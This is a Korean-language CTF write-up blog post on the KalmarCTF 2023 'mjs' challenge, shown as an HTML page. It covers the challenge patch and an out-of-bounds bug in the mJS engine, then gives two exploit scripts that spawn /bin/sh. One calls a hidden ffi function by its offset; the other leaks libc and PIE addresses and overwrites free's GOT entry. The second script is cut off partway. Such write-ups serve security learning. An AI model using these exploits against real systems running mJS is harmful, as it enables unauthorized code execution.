<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;1878   Toddler’s first browser exploitation: https:&#x2F;&#x2F;github.com&#x2F;cesanta&#x2F;mjsnc 54.93.211.13 10002clone, pwn, warmup   [52 solves &#x2F; 100 points]  처음으로 포너블에 나온 자바스크립트 엔진 문제">
<meta property="og:type" content="article">
<meta property="og:title" content="KalmarCTF 2023 - mjs (JS Engine, OOB)">
<meta property="og:url" content="https://jiravvit.github.io/230318-kalmarctf2023-mjs/index.html">
<meta property="og:site_name" content="jir4vvit">
<meta property="og:description" content="https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;1878   Toddler’s first browser exploitation: https:&#x2F;&#x2F;github.com&#x2F;cesanta&#x2F;mjsnc 54.93.211.13 10002clone, pwn, warmup   [52 solves &#x2F; 100 points]  처음으로 포너블에 나온 자바스크립트 엔진 문제">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://jiravvit.github.io/images/230318-kalmarctf2023-mjs/Screenshot%202023-03-18%20at%2020.44.28.png">
<meta property="og:image" content="https://jiravvit.github.io/images/230318-kalmarctf2023-mjs/Screenshot%202023-03-18%20at%2020.28.08.png">
<meta property="og:image" content="https://jiravvit.github.io/images/230318-kalmarctf2023-mjs/Screenshot%202023-03-18%20at%2020.59.36.png">
<meta property="og:image" content="https://jiravvit.github.io/images/230318-kalmarctf2023-mjs/Screenshot%202023-03-18%20at%2021.09.58.png">
<meta property="og:image" content="https://jiravvit.github.io/images/230318-kalmarctf2023-mjs/Screenshot%202023-03-18%20at%2021.34.16.png">
<meta property="article:published_time" content="2023-03-17T23:00:00.000Z">
<meta property="article:modified_time" content="2023-03-29T16:19:08.411Z">
<meta property="article:author" content="jir4vvit">
<meta property="article:tag" content="OOB">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://jiravvit.github.io/images/230318-kalmarctf2023-mjs/Screenshot%202023-03-18%20at%2020.44.28.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/judi2.jpg">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/judi2.jpg" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/judi2.jpg">
        
      
    
    <!-- title -->
    <title>KalmarCTF 2023 - mjs (JS Engine, OOB)</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/230320-wolvctf2023-escaped/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/230309-algorithm-two_pointer/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jiravvit.github.io/230318-kalmarctf2023-mjs/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jiravvit.github.io/230318-kalmarctf2023-mjs/&text=KalmarCTF 2023 - mjs (JS Engine, OOB)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jiravvit.github.io/230318-kalmarctf2023-mjs/&title=KalmarCTF 2023 - mjs (JS Engine, OOB)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jiravvit.github.io/230318-kalmarctf2023-mjs/&is_video=false&description=KalmarCTF 2023 - mjs (JS Engine, OOB)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=KalmarCTF 2023 - mjs (JS Engine, OOB)&body=Check out this article: https://jiravvit.github.io/230318-kalmarctf2023-mjs/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jiravvit.github.io/230318-kalmarctf2023-mjs/&title=KalmarCTF 2023 - mjs (JS Engine, OOB)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jiravvit.github.io/230318-kalmarctf2023-mjs/&title=KalmarCTF 2023 - mjs (JS Engine, OOB)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jiravvit.github.io/230318-kalmarctf2023-mjs/&title=KalmarCTF 2023 - mjs (JS Engine, OOB)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jiravvit.github.io/230318-kalmarctf2023-mjs/&title=KalmarCTF 2023 - mjs (JS Engine, OOB)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jiravvit.github.io/230318-kalmarctf2023-mjs/&name=KalmarCTF 2023 - mjs (JS Engine, OOB)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jiravvit.github.io/230318-kalmarctf2023-mjs/&t=KalmarCTF 2023 - mjs (JS Engine, OOB)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">1.</span> <span class="toc-text">Analysis</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1"><span class="toc-number">1.1.</span> <span class="toc-text">(1)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2"><span class="toc-number">1.2.</span> <span class="toc-text">(2)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solve-1"><span class="toc-number">2.</span> <span class="toc-text">Solve 1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Code"><span class="toc-number">2.1.</span> <span class="toc-text">Exploit Code</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solve-2"><span class="toc-number">3.</span> <span class="toc-text">Solve 2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Code-1"><span class="toc-number">3.1.</span> <span class="toc-text">Exploit Code</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        KalmarCTF 2023 - mjs (JS Engine, OOB)
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">jir4vvit</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-03-17T23:00:00.000Z" itemprop="datePublished">2023-03-18</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/WriteUp/">WriteUp</a> › <a class="category-link" href="/categories/WriteUp/Kalmar/">Kalmar</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/OOB/" rel="tag">OOB</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <ul>
<li><a target="_blank" rel="noopener" href="https://ctftime.org/event/1878">https://ctftime.org/event/1878</a></li>
</ul>
<blockquote>
<p>Toddler’s first browser exploitation: <a target="_blank" rel="noopener" href="https://github.com/cesanta/mjs">https://github.com/cesanta/mjs</a><br><code>nc 54.93.211.13 10002</code><br><code>clone</code>, <code>pwn</code>, <code>warmup</code></p>
</blockquote>
<ul>
<li>[52 solves &#x2F; 100 points]</li>
</ul>
<p>처음으로 포너블에 나온 자바스크립트 엔진 문제를 완주했다..! 풀이를 두 가지 소개한다. 첫 번째 풀이는 내가 풀이한 방식이고 두 번째는 친구가 풀이한 방식이다. 친구 풀이 보면서 많이 공부할 수 있었다.</p>
<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>이 문제는 description에 포함된 mjs 레포를 참고해서 분석을 해야한다. 문제에서는 브라우저 익스라고 표현했지만 레포에 들어가서 Overview를 읽어보면 브라우저에 실제로 쓰이는 엔진인지는 잘 모르겠다..ㅎ IoT 기기에서 볼 수 있을 것 같다.</p>
<p>아무튼 이 문제에서 diff.patch 파일을 제공해줬는데 살펴보자. </p>
<figure class="highlight patch"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/Makefile b/Makefile</span></span><br><span class="line"><span class="comment">index d265d7e..d495e84 100644</span></span><br><span class="line"><span class="comment">--- a/Makefile</span></span><br><span class="line"><span class="comment">+++ b/Makefile</span></span><br><span class="line"><span class="meta">@@ -5,6 +5,7 @@</span> BUILD_DIR = build</span><br><span class="line"> RD ?= docker run -v $(CURDIR):$(CURDIR) --user=$(shell id -u):$(shell id -g) -w $(CURDIR)</span><br><span class="line"> DOCKER_GCC ?= $(RD) mgos/gcc</span><br><span class="line"> DOCKER_CLANG ?= $(RD) mgos/clang</span><br><span class="line"><span class="addition">+CC = clang</span></span><br><span class="line"> </span><br><span class="line"> include $(SRCPATH)/mjs_sources.mk</span><br><span class="line"> </span><br><span class="line"><span class="meta">@@ -81,7 +82,7 @@</span> CFLAGS += $(COMMON_CFLAGS)</span><br><span class="line"> # NOTE: we compile straight from sources, not from the single amalgamated file,</span><br><span class="line"> # in order to make sure that all sources include the right headers</span><br><span class="line"> $(PROG): $(TOP_MJS_SOURCES) $(TOP_COMMON_SOURCES) $(TOP_HEADERS) $(BUILD_DIR)</span><br><span class="line"><span class="deletion">-	$(DOCKER_CLANG) clang $(CFLAGS) $(TOP_MJS_SOURCES) $(TOP_COMMON_SOURCES) -o $(PROG)</span></span><br><span class="line"><span class="addition">+	$(CC) $(CFLAGS) $(TOP_MJS_SOURCES) $(TOP_COMMON_SOURCES) -o $(PROG)</span></span><br><span class="line"> </span><br><span class="line"> $(BUILD_DIR):</span><br><span class="line"> 	mkdir -p $@</span><br><span class="line"><span class="comment">diff --git a/src/mjs_builtin.c b/src/mjs_builtin.c</span></span><br><span class="line"><span class="comment">index 6f51e08..36c2b43 100644</span></span><br><span class="line"><span class="comment">--- a/src/mjs_builtin.c</span></span><br><span class="line"><span class="comment">+++ b/src/mjs_builtin.c</span></span><br><span class="line"><span class="meta">@@ -137,12 +137,12 @@</span> void mjs_init_builtin(struct mjs *mjs, mjs_val_t obj) &#123;</span><br><span class="line">           mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_load));</span><br><span class="line">   mjs_set(mjs, obj, &quot;print&quot;, ~0,</span><br><span class="line">           mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_print));</span><br><span class="line"><span class="deletion">-  mjs_set(mjs, obj, &quot;ffi&quot;, ~0,</span></span><br><span class="line"><span class="deletion">-          mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_ffi_call));</span></span><br><span class="line"><span class="deletion">-  mjs_set(mjs, obj, &quot;ffi_cb_free&quot;, ~0,</span></span><br><span class="line"><span class="deletion">-          mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_ffi_cb_free));</span></span><br><span class="line"><span class="deletion">-  mjs_set(mjs, obj, &quot;mkstr&quot;, ~0,</span></span><br><span class="line"><span class="deletion">-          mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_mkstr));</span></span><br><span class="line"><span class="addition">+  /* mjs_set(mjs, obj, &quot;ffi&quot;, ~0, */</span></span><br><span class="line"><span class="addition">+  /*         mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_ffi_call)); */</span></span><br><span class="line"><span class="addition">+  /* mjs_set(mjs, obj, &quot;ffi_cb_free&quot;, ~0, */</span></span><br><span class="line"><span class="addition">+  /*         mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_ffi_cb_free)); */</span></span><br><span class="line"><span class="addition">+  /* mjs_set(mjs, obj, &quot;mkstr&quot;, ~0, */</span></span><br><span class="line"><span class="addition">+  /*         mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_mkstr)); */</span></span><br><span class="line">   mjs_set(mjs, obj, &quot;getMJS&quot;, ~0,</span><br><span class="line">           mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_get_mjs));</span><br><span class="line">   mjs_set(mjs, obj, &quot;die&quot;, ~0,</span><br><span class="line"><span class="meta">@@ -151,8 +151,8 @@</span> void mjs_init_builtin(struct mjs *mjs, mjs_val_t obj) &#123;</span><br><span class="line">           mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_do_gc));</span><br><span class="line">   mjs_set(mjs, obj, &quot;chr&quot;, ~0,</span><br><span class="line">           mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_chr));</span><br><span class="line"><span class="deletion">-  mjs_set(mjs, obj, &quot;s2o&quot;, ~0,</span></span><br><span class="line"><span class="deletion">-          mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_s2o));</span></span><br><span class="line"><span class="addition">+  /* mjs_set(mjs, obj, &quot;s2o&quot;, ~0, */</span></span><br><span class="line"><span class="addition">+  /*         mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_s2o)); */</span></span><br><span class="line"> </span><br><span class="line">   /*</span><br><span class="line">    * Populate JSON.parse() and JSON.stringify()</span><br><span class="line"><span class="comment">diff --git a/src/mjs_exec.c b/src/mjs_exec.c</span></span><br><span class="line"><span class="comment">index bd48fea..24c2c7c 100644</span></span><br><span class="line"><span class="comment">--- a/src/mjs_exec.c</span></span><br><span class="line"><span class="comment">+++ b/src/mjs_exec.c</span></span><br><span class="line"><span class="meta">@@ -835,7 +835,7 @@</span> MJS_PRIVATE mjs_err_t mjs_execute(struct mjs *mjs, size_t off, mjs_val_t *res) &#123;</span><br><span class="line"> </span><br><span class="line">           *func = MJS_UNDEFINED;  // Return value</span><br><span class="line">           // LOG(LL_VERBOSE_DEBUG, (&quot;CALLING  %d&quot;, i + 1));</span><br><span class="line"><span class="deletion">-        &#125; else if (mjs_is_string(*func) || mjs_is_ffi_sig(*func)) &#123;</span></span><br><span class="line"><span class="addition">+        &#125; else if (mjs_is_ffi_sig(*func)) &#123;</span></span><br><span class="line">           /* Call ffi-ed function */</span><br><span class="line"> </span><br><span class="line">           call_stack_push_frame(mjs, bp.start_idx + i, retval_stack_idx);</span><br></pre></td></tr></table></figure>

<p>Built-in API에서 <code>ffi</code>, <code>ffi_cb_free</code>, <code>mkstr</code> 기능을 지웠다고 이해했다. 지워진 기능들 중 하나인 <code>ffi</code>는 아주 강력한 API이다. 아래와 같이 사용이 가능한데, C함수를 아래와 같이 Import해서 사용 가능하다. 이것을 사용할 수 있으면 바로 <code>system(&#39;/bin/sh\x00&#39;)</code>을 실행해버리면 될텐데..</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> f = <span class="title function_">ffi</span>(<span class="string">&#x27;int foo(int)&#x27;</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>Import C function into mJS. See next section.</li>
</ul>
<p>라는 생각을 하면서 이것저것 코드를 작성하다가 알게된 사실 두 가지가 있다. 미리 이야기하자면 OOB가 발생한다.</p>
<h3 id="1"><a href="#1" class="headerlink" title="(1)"></a>(1)</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">getMJS</span>()[<span class="number">0x41414141</span>]; </span><br></pre></td></tr></table></figure>

<img src="/images/230318-kalmarctf2023-mjs/Screenshot 2023-03-18 at 20.44.28.png" width=800/>
<br>

<p>OOB가 발생해서 터진다. 터진 instruction을 보면 rax와 rcx를 더한 주소에 접근하려다가 터진 것을 볼 수 있다. getMJS 객체가 가리키는 곳은 <code>0x005555555812a0</code> 이다. 이 주소를 기준으로 원하는 주소에 접근하거나 쓸 수 있다. 테스트를 하다보면 OOB read와 OOB write 모두 발생한다. Solve 2에서 OOB read를 이용해서 필요한 주소를 leak했고, OOB write를 이용해서 got를 덮어서 문제를 익스했다.</p>
<p>Solve 1에서는 read나 write가 발생한다는 것에 집중하지 않고 임의 주소에 접근이 가능하다는 것만 생각하면서 소스 코드를 보고 풀이를 작성했다.</p>
<h3 id="2"><a href="#2" class="headerlink" title="(2)"></a>(2)</h3><p>소스 코드를 보면서 알아낸 것이다.</p>
<img src="/images/230318-kalmarctf2023-mjs/Screenshot 2023-03-18 at 20.28.08.png" width=600/>
<br>

<p>patch에서 분명 API만 주석처리 했다. 그러면 저 함수는 어떻게 될까? 저 함수도 분명 컴파일이 되어서 바이너리 내부에 존재할 것이고 OOB로 임의 주소에 접근 가능하니까 저 함수를 실행할 수도 있겠다고 생각했다.</p>
<img src="/images/230318-kalmarctf2023-mjs/Screenshot 2023-03-18 at 20.59.36.png" width=400/>
<br>

<h2 id="Solve-1"><a href="#Solve-1" class="headerlink" title="Solve 1"></a>Solve 1</h2><p>나머지는 이제 <code>ffi</code> API 사용법만 알면 된다. 이 부분은 mjs 레포를 살펴보고 사용법을 익혔다.</p>
<h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> system = (getMJS+<span class="number">0x6a10</span>)(<span class="string">&#x27;int system(char *)&#x27;</span>); <span class="title function_">system</span>(<span class="string">&#x27;/bin/sh\x00&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>풀려서 당황했고 풀고나서 하루종일 기분이 좋았다.. ㅎ</p>
<h2 id="Solve-2"><a href="#Solve-2" class="headerlink" title="Solve 2"></a>Solve 2</h2><img src="/images/230318-kalmarctf2023-mjs/Screenshot 2023-03-18 at 21.09.58.png" width=400/>
<br>

<p>OOB read와 write를 이용해서 필요한 주소를 leak하고 got를 덮어서 <code>system(&#39;/bin/sh\x00&#39;)</code>를 실행시키는 방법이다.</p>
<ol>
<li><p>libc leak</p>
</li>
<li><p>environ 이용해서 pie leak</p>
</li>
</ol>
<ul>
<li>처음에 프로그램이 시작되면 MJS 객체가 생긴다. (<code>0x005555555812a0</code>) <code>getMJS()</code>를 호출하게 되면 힙에 새로운 주소가 생기는데 저 MJS 객체를 가리킨다. 참고로 environ은 stack에서 main 아래 영역을 가리킨다. 즉, environ에는 stack 주소가 저장되어 있다. stack에는 pie 주소가 저장되어 있기 마련이다. 처음에 MJS 객체를 가리키는 mjs와 mjs2를 생성했다. mjs2가 가리키는 주소를 MJS 객체가 아닌 environ으로 변경한다. OOB read를 이용해서 environ에 저장된 주소를 출력할 수 있는데 이 stack 주소에서 적절히 offset을 조절해서 pie base를 구할 수 있다.</li>
</ul>
<ol start="3">
<li>free의 got를 system 함수로 덮기</li>
</ol>
<ul>
<li>앞서 pie leak을 한 것과 비슷하다. mjs2가 가리키는 주소를 free_got로 변경하고 free_got에 system 주소를 쓴다.</li>
</ul>
<ol start="4">
<li>‘&#x2F;bin&#x2F;sh\x00’</li>
</ol>
<ul>
<li>system 함수는 인자가 하나니까 첫 번째 인자를 호출하는 함수를 조작하는 것을 목표로 한다. 두 가지 방식을 찾았다. mjs의 Built-in API 중 하나인 <code>die</code> 구현 내부에서 free를 호출한다. 이 방법이 친구가 풀이한 방식이다. 그리고 다시 풀이하면서 다른 방식도 찾아봤다. 또 다른 방식은 소스 코드 초반에 <code>//bin/sh</code>를 추가하고 그냥 자바스크립트 코드를 실행한다. mjs 바이너리에 자바스크립트 코드를 전부 실행하고 한 줄씩 해제하는 코드가 있기 때문에 해당 풀이가 가능하다.</li>
</ul>
<img src="/images/230318-kalmarctf2023-mjs/Screenshot 2023-03-18 at 21.34.16.png" width=600/>
<br>

<h3 id="Exploit-Code-1"><a href="#Exploit-Code-1" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//bin/sh</span></span><br><span class="line"><span class="comment">// MJS 객체 0x005555555812a0 를 가리키는 mjs와 mjs2. </span></span><br><span class="line"><span class="comment">// 모두 힙에 저장됨</span></span><br><span class="line"><span class="keyword">let</span> mjs = <span class="title function_">getMJS</span>();</span><br><span class="line"><span class="comment">// let xxx = 0x12345678;</span></span><br><span class="line"><span class="keyword">let</span> mjs2 = <span class="title function_">getMJS</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="string">&#x27;mjs:&#x27;</span>, mjs); </span><br><span class="line"><span class="title function_">print</span>(<span class="string">&#x27;mjs2:&#x27;</span>, mjs2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> libc_leak = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 0x     90</span></span><br><span class="line"><span class="comment">// 0x   5d00</span></span><br><span class="line"><span class="comment">// 0x 180000</span></span><br><span class="line"><span class="comment">// 0x 185d90</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x8</span>; ++i) &#123;</span><br><span class="line">    libc_leak += mjs[<span class="number">0x140</span> + i] &lt;&lt; (i * <span class="number">8</span>);</span><br><span class="line">    <span class="title function_">print</span>(mjs[<span class="number">0x140</span> + i] &lt;&lt; (i * <span class="number">8</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// mjs[0x41414141]; </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> libc_base = libc_leak - <span class="number">0x81d90</span>;</span><br><span class="line"><span class="keyword">let</span> system = libc_base + <span class="number">0x49990</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="string">&#x27;libc_base:&#x27;</span>, libc_base);</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&#x27;system:&#x27;</span>, system);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">overwrite_mjs2</span>(<span class="params">address</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i) &#123;</span><br><span class="line">        mjs[<span class="number">0x360</span> + i] = address &amp; <span class="number">0xff</span>;</span><br><span class="line">        <span class="comment">// mjs2[i] = address &amp; 0xff;</span></span><br><span class="line">        address &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">read64</span>(<span class="params">address</span>) &#123;</span><br><span class="line">    <span class="title function_">overwrite_mjs2</span>(address);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> retval = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i) &#123;</span><br><span class="line">        retval += mjs2[i] &lt;&lt; (i * <span class="number">8</span>);</span><br><span class="line">        <span class="comment">// retval += mjs[0x360 + i] &lt;&lt; (i * 8);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write64</span>(<span class="params">address, value</span>) &#123;</span><br><span class="line">    <span class="title function_">overwrite_mjs2</span>(address);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> retval = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i) &#123;</span><br><span class="line">        mjs2[i] = value &amp; <span class="number">0xff</span>;</span><br><span class="line">        value &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// mjs2가 MJS 객체 대신 environ을 가리키게 함</span></span><br><span class="line"><span class="keyword">let</span> environ = <span class="title function_">read64</span>(libc_base + <span class="number">0x1e0140</span>);</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&#x27;environ 